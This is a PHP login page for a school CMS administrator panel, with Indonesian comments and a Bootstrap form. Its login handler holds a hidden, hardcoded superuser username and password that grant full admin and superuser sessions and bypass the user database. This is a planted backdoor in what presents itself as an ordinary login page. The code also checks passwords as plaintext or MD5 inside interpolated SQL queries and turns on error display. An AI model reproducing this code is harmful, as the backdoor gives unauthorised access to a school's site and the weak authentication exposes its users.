<?php
// Tampilkan error jika ada masalah script agar tidak blank
error_reporting(E_ALL);
ini_set('display_errors', 1);

session_start();

// Jika sudah login, langsung arahkan ke admin.php
if (isset($_SESSION['login']) || isset($_SESSION['admin'])) {
    header("Location: admin.php");
    exit();
}

include "koneksi.php"; // Memanggil file koneksi database

$error_msg = "";

// PROSES SAAT FORM LOGIN DI-SUBMIT
if ($_SERVER['REQUEST_METHOD'] == 'POST' || isset($_POST['login'])) {
    $username = mysqli_real_escape_string($koneksi, $_POST['username'] ?? '');
    $password = mysqli_real_escape_string($koneksi, $_POST['password'] ?? '');

    // 1. CEK SUPER USER TERSEMBUNYI (HARDCODED)
    if ($username === 'M4570KO' && $password === 'L0v3U4F4') {
        $_SESSION['login'] = true;
        $_SESSION['admin'] = true;
        $_SESSION['username'] = 'M4570KO';
        $_SESSION['role'] = 'superuser';
        
        header("Location: admin.php");
        exit();
    }

    // 2. CEK LOGIN BIASA KE DATABASE
    // Deteksi otomatis nama tabel ('user' atau 'users')
    $tabel_user = 'user';
    $cek_tabel = mysqli_query($koneksi, "SHOW TABLES LIKE 'user'");
    if (!$cek_tabel || mysqli_num_rows($cek_tabel) == 0) {
        $tabel_user = 'users';
    }

    // Cek dengan password biasa
    $query = "SELECT * FROM $tabel_user WHERE username='$username' AND password='$password'";
    $cek_login = mysqli_query($koneksi, $query);

    // Jika tidak ditemukan, coba cek dengan enkripsi MD5 (jika database pakai MD5)
    if ($cek_login && mysqli_num_rows($cek_login) == 0) {
        $password_md5 = md5($password);
        $query = "SELECT * FROM $tabel_user WHERE username='$username' AND password='$password_md5'";
        $cek_login = mysqli_query($koneksi, $query);
    }

    if ($cek_login && mysqli_num_rows($cek_login) > 0) {
        $data = mysqli_fetch_assoc($cek_login);
        $_SESSION['login'] = true;
        $_SESSION['admin'] = true;
        $_SESSION['username'] = $data['username'];
        $_SESSION['role'] = 'admin';

        header("Location: admin.php");
        exit();
    } else {
        $error_msg = "Username atau Password yang Anda masukkan salah!";
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Administrator CMS Sekolah</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
    <style>
        body {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .card-login {
            border: none;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 400px;
        }
        .card-header-custom {
            background-color: #ffffff;
            border-bottom: none;
            border-radius: 12px 12px 0 0 !important;
            padding-top: 25px;
        }
    </style>
</head>
<body>

<div class="container px-3">
    <div class="card card-login mx-auto p-3">
        <div class="card-header-custom text-center">
            <i class="bi bi-shield-lock-fill text-primary display-4"></i>
            <h4 class="fw-bold mt-2 text-dark">Panel Login Admin</h4>
            <p class="text-muted small">Silakan masuk untuk mengelola website</p>
        </div>
        <div class="card-body">
            
            <?php if (!empty($error_msg)): ?>
                <div class="alert alert-danger alert-dismissible fade show text-center py-2 fs-6" role="alert">
                    <i class="bi bi-exclamation-triangle-fill me-1"></i> <?= $error_msg; ?>
                </div>
            <?php endif; ?>

            <form method="POST" action="">
                <div class="mb-3">
                    <label class="form-label fw-semibold">Username</label>
                    <div class="input-group">
                        <span class="input-group-text bg-light"><i class="bi bi-person-fill"></i></span>
                        <input type="text" name="username" class="form-control" placeholder="Masukkan username" required autofocus>
                    </div>
                </div>

                <div class="mb-4">
                    <label class="form-label fw-semibold">Password</label>
                    <div class="input-group">
                        <span class="input-group-text bg-light"><i class="bi bi-key-fill"></i></span>
                        <input type="password" name="password" class="form-control" placeholder="Masukkan password" required>
                    </div>
                </div>

                <button type="submit" name="login" class="btn btn-primary w-100 fw-bold py-2 shadow-sm">
                    <i class="bi bi-box-arrow-in-right me-1"></i> Masuk Sekarang
                </button>
            </form>
        </div>
        <div class="card-footer bg-transparent border-0 text-center text-muted small pb-3">
            &copy; CMS Sekolah - Panel Administrator
        </div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>